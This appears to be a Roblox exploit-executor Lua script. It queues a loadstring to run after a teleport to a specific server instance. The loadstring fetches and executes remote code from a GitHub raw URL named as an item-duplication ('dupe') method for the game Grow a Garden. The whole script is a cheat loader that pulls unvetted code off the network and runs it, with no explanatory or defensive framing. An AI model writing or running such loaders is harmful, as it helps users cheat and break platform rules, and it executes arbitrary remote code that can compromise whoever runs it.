local TeleportService = game:GetService("TeleportService")
local targetJobId = "05f1faa2-3914-490e-92a2-882268a8448c"

local postTeleportScript = [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/scytheXlol/Grow-A-Garden-OP-Methods/refs/heads/main/dupe.lua'))()
]]

queue_on_teleport(postTeleportScript)

teleport_to_place_instance(game.PlaceId, targetJobId)
